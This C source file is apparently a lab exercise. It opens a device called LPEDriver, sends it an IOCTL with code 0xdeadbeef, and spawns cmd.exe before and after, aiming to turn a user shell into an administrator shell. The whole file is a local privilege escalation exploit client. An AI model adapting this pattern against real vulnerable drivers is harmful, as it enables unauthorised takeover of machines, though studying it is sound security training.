#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define IO_CONTROL_CODE 0xdeadbeef

int Error(const char* message) {
	printf("%s (error=%d)\n", message, GetLastError());
	return 1;
}

void privilegeEscalation() {
	DWORD returned;
	HANDLE hDevice = CreateFile(
		L"\\\\.\\LPEDriver",
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to open device");
		exit(1);
	}

	printf("[*] Privilege Escalation ... \n");
	BOOL status = DeviceIoControl(
		hDevice,
		IO_CONTROL_CODE,
		NULL,
		0,
		NULL,
		0,
		&returned,
		NULL
	);

	if (!status) {
		printf("[!] IOCTL failed : %d\n", GetLastError());
		exit(1);
	}

	CloseHandle(hDevice);
}

int main(void) {
	printf("[*] Spawn cmd.exe with User priv ... \n");
	system("start cmd.exe");

	privilegeEscalation();

	printf("[*] Spawn cmd.exe with Admin priv ... \n");
	system("start cmd.exe");

	return 0;
}